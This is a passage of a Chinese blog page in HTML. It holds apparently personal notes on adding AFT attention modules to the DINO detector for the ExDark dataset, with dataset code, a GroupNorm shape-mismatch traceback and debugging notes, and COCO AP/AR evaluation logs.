class="line">        <span class="string">&quot;val&quot;</span>: (<span class="string">&quot;val&quot;</span>, Path(<span class="string">&quot;annotations&quot;</span>) / <span class="string">f&#x27;<span class="subst">&#123;mode&#125;</span>_val.json&#x27;</span>),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    img_folder, ann_file = PATHS[image_set]</span><br><span class="line">    img_folder_path = img_folder_root / img_folder</span><br><span class="line">    ann_folder = ann_folder_root / <span class="string">f&#x27;<span class="subst">&#123;mode&#125;</span>_<span class="subst">&#123;img_folder&#125;</span>&#x27;</span></span><br><span class="line">    ann_file = ann_folder_root / ann_file</span><br><span class="line"></span><br><span class="line">    dataset = ExDark(img_folder_path, ann_folder, ann_file,</span><br><span class="line">                     transforms=make_coco_transforms(image_set), return_masks=args.masks)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dataset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>详见加载数据集。</p><hr><h1 id="4-AFT模块的输入每次都发生变化"><a href="#4-AFT模块的输入每次都发生变化" class="headerlink" title="4 AFT模块的输入每次都发生变化"></a>4 AFT模块的输入每次都发生变化</h1><p>为什么在修改后的DINO中aft模块的输入每次都不一样，第一次是817，第二次是856？</p><p>首先需要弄明白这个数字代表什么意思？</p><p>打印了一下从数据集中取出来的数据，内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">samples: &#123;<span class="string">&#x27;tensors.shape&#x27;</span>: torch.Size([<span class="number">2</span>, <span class="number">3</span>, <span class="number">820</span>, <span class="number">826</span>]), <span class="string">&#x27;mask.shape&#x27;</span>: torch.Size([<span class="number">2</span>, <span class="number">820</span>, <span class="number">826</span>])&#125;</span><br><span class="line">target: [&#123;<span class="string">&#x27;boxes&#x27;</span>: tensor([[<span class="number">0.3312</span>, <span class="number">0.9495</span>, <span class="number">0.1812</span>, <span class="number">0.1010</span>]], device=<span class="string">&#x27;cuda:0&#x27;</span>), <span class="string">&#x27;labels&#x27;</span>: tensor([<span class="number">1</span>], device=<span class="string">&#x27;cuda:0&#x27;</span>), <span class="string">&#x27;image_id&#x27;</span>: tensor([<span class="number">1029</span>], device=<span class="string">&#x27;cuda:0&#x27;</span>), <span class="string">&#x27;area&#x27;</span>: tensor([<span class="number">10646.6445</span>], device=<span class="string">&#x27;cuda:0&#x27;</span>), <span class="string">&#x27;iscrowd&#x27;</span>: tensor([<span class="number">0</span>], device=<span class="string">&#x27;cuda:0&#x27;</span>), <span class="string">&#x27;orig_size&#x27;</span>: tensor([ <span class="number">900</span>, <span class="number">1440</span>], device=<span class="string">&#x27;cuda:0&#x27;</span>), <span class="string">&#x27;size&#x27;</span>: tensor([<span class="number">704</span>, <span class="number">826</span>], device=<span class="string">&#x27;cuda:0&#x27;</span>)&#125;, &#123;<span class="string">&#x27;boxes&#x27;</span>: tensor([[<span class="number">0.2429</span>, <span class="number">0.8480</span>, <span class="number">0.2006</span>, <span class="number">0.2071</span>],</span><br><span class="line">        [<span class="number">0.0666</span>, <span class="number">0.8188</span>, <span class="number">0.1060</span>, <span class="number">0.1850</span>],</span><br><span class="line">        [<span class="number">0.6082</span>, <span class="number">0.4589</span>, <span class="number">0.5473</span>, <span class="number">0.9129</span>]], device=<span class="string">&#x27;cuda:0&#x27;</span>), <span class="string">&#x27;labels&#x27;</span>: tensor([ <span class="number">2</span>,  <span class="number">2</span>, <span class="number">10</span>], device=<span class="string">&#x27;cuda:0&#x27;</span>), <span class="string">&#x27;image_id&#x27;</span>: tensor([<span class="number">1335</span>], device=<span class="string">&#x27;cuda:0&#x27;</span>), <span class="string">&#x27;area&#x27;</span>: tensor([ <span class="number">19622.2344</span>,   <span class="number">9264.0713</span>, <span class="number">235995.3125</span>], device=<span class="string">&#x27;cuda:0&#x27;</span>), <span class="string">&#x27;iscrowd&#x27;</span>: tensor([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], device=<span class="string">&#x27;cuda:0&#x27;</span>), <span class="string">&#x27;orig_size&#x27;</span>: tensor([<span class="number">500</span>, <span class="number">357</span>], device=<span class="string">&#x27;cuda:0&#x27;</span>), <span class="string">&#x27;size&#x27;</span>: tensor([<span class="number">820</span>, <span class="number">576</span>], device=<span class="string">&#x27;cuda:0&#x27;</span>)&#125;]</span><br></pre></td></tr></table></figure><p>其中，samples中的第一个元素tensors的形状解释如下：</p><ul><li>2：batch_size</li><li>3：图像的通道</li><li>820：图像的长</li><li>826：图像的宽</li></ul><p>用了原来的模型跑了一下，发现虽然输入的长和宽也在发生变化，但是模型依旧能够训练起来，现在需要找一下原因。</p><hr><h1 id="5-RuntimeError-Expected-weight-to-be-a-vector-of-size-equal"><a href="#5-RuntimeError-Expected-weight-to-be-a-vector-of-size-equal" class="headerlink" title="5 RuntimeError: Expected weight to be a vector of size equal"></a>5 RuntimeError: Expected weight to be a vector of size equal</h1><p>完整报错如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/autodl-tmp/DINO/main.py&quot;</span>, line <span class="number">401</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    main(args)</span><br><span class="line">  File <span class="string">&quot;/root/autodl-tmp/DINO/main.py&quot;</span>, line <span class="number">286</span>, <span class="keyword">in</span> main</span><br><span class="line">    train_stats = train_one_epoch(</span><br><span class="line">  File <span class="string">&quot;/root/autodl-tmp/DINO/engine.py&quot;</span>, line <span class="number">48</span>, <span class="keyword">in</span> train_one_epoch</span><br><span class="line">    outputs = model(samples, targets)</span><br><span class="line">  File <span class="string">&quot;/root/miniconda3/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line <span class="number">1194</span>, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="keyword">return</span> forward_call(*<span class="built_in">input</span>, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/root/autodl-tmp/DINO/models/dino/dino.py&quot;</span>, line <span class="number">254</span>, <span class="keyword">in</span> forward</span><br><span class="line">    y = <span class="variable language_">self</span>.test2(y)</span><br><span class="line">  File <span class="string">&quot;/root/miniconda3/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line <span class="number">1194</span>, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="keyword">return</span> forward_call(*<span class="built_in">input</span>, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/root/miniconda3/lib/python3.10/site-packages/torch/nn/modules/normalization.py&quot;</span>, line <span class="number">273</span>, <span class="keyword">in</span> forward</span><br><span class="line">    <span class="keyword">return</span> F.group_norm(</span><br><span class="line">  File <span class="string">&quot;/root/miniconda3/lib/python3.10/site-packages/torch/nn/functional.py&quot;</span>, line <span class="number">2528</span>, <span class="keyword">in</span> group_norm</span><br><span class="line">    <span class="keyword">return</span> torch.group_norm(<span class="built_in">input</span>, num_groups, weight, bias, eps, torch.backends.cudnn.enabled)</span><br><span class="line">RuntimeError: Expected weight to be a vector of size equal to the number of channels <span class="keyword">in</span> <span class="built_in">input</span>, but got weight of shape [<span class="number">256</span>] <span class="keyword">and</span> <span class="built_in">input</span> of shape [<span class="number">256</span>, <span class="number">544</span>, <span class="number">820</span>]</span><br></pre></td></tr></table></figure><p>输入的权重和模型期待的输入形状不符合，因此报错。</p><h2 id="5-1-分析"><a href="#5-1-分析" class="headerlink" title="5.1 分析"></a>5.1 分析</h2><p>但是这里显示都是256个维度，所以就很奇怪，问了学长可能是由于加载了之前训练的模型，导致出现这个错误。</p><p>产生这个问题的背景：我前一天成功训练了aft_simple，但是今天再训练的时候就报了以上错误，但是现在我已经把之前训练的模型以及所在的文件夹都给删除了，但还是报这个错误。</p><p>理性分析一下，首先不要急躁，出现这个问题说明代码中肯定有哪个地方有问题，但是我现在不知道如何去定位这个问题。</p><p>因为在<code>autodl</code>平台上有一份代码，然后在本地有一份代码，所以就导致有些混乱，虽然我每次修改代码时都尽量在2个地方进行同步。</p><p>现在先确保2个平台上的代码一致吧，还是不对，重新clone一份代码吧，不知道问题出在哪。</p><p>试了还是不对，新试的肯定没有保存过的模型，但是还是不对，到底哪里出了问题，感觉肯定是新增加的模块出了问题。</p><p>所以还是检查一下aft的问题吧。</p><hr><h1 id="6-结果记录"><a href="#6-结果记录" class="headerlink" title="6 结果记录"></a>6 结果记录</h1><h2 id="6-1-AFT-Simple"><a href="#6-1-AFT-Simple" class="headerlink" title="6.1 AFT_Simple"></a>6.1 AFT_Simple</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IoU metric: bbox</span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.001</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.003</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.75</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.001</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=  <span class="number">1</span> ] = <span class="number">0.015</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets= <span class="number">10</span> ] = <span class="number">0.027</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.041</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.049</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IoU metric: bbox</span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.001</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.75</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=  <span class="number">1</span> ] = <span class="number">0.004</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets= <span class="number">10</span> ] = <span class="number">0.013</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.021</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.001</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.029</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.174</span></span><br><span class="line">Average Precision  (AP) @[ IoU=<span class="number">0.50</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.299</span></span><br><span class="line">Average Precision  (AP) @[ IoU=<span class="number">0.75</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.183</span></span><br><span class="line">Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.049</span></span><br><span class="line">Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.088</span></span><br><span class="line">Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.217</span></span><br><span class="line">Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=  <span class="number">1</span> ] = <span class="number">0.259</span></span><br><span class="line">Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets= <span class="number">10</span> ] = <span class="number">0.412</span></span><br><span class="line">Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.520</span></span><br><span class="line">Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.089</span></span><br><span class="line">Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.299</span></span><br><span class="line">Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.603</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IoU metric: bbox</span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.325</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.550</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.75</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.338</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.108</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.184</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.389</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=  <span class="number">1</span> ] = <span class="number">0.317</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets= <span class="number">10</span> ] = <span class="number">0.506</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.573</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.284</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.399</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.639</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IoU metric: bbox</span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.333</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.575</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.75</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.339</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.148</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.201</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.394</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=  <span class="number">1</span> ] = <span class="number">0.320</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets= <span class="number">10</span> ] = <span class="number">0.509</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.586</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.295</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.456</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.632</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IoU metric: bbox</span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.385</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.633</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.75</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.409</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.146</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.232</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.449</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=  <span class="number">1</span> ] = <span class="number">0.345</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets= <span class="number">10</span> ] = <span class="number">0.542</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.622</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.338</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.484</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.674</span></span><br></pre></td></tr></table></figure><h2 id="6-2-AFT-Conv"><a href="#6-2-AFT-Conv" class="headerlink" title="6.2 AFT_Conv"></a>6.2 AFT_Conv</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IoU metric: bbox</span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.001</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.004</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.75</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.001</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=  <span class="number">1</span> ] = <span class="number">0.012</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets= <span class="number">10</span> ] = <span class="number">0.042</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.066</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.002</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.084</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IoU metric: bbox</span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.001</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.75</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.001</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=  <span class="number">1</span> ] = <span class="number">0.011</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets= <span class="number">10</span> ] = <span class="number">0.023</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.034</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span 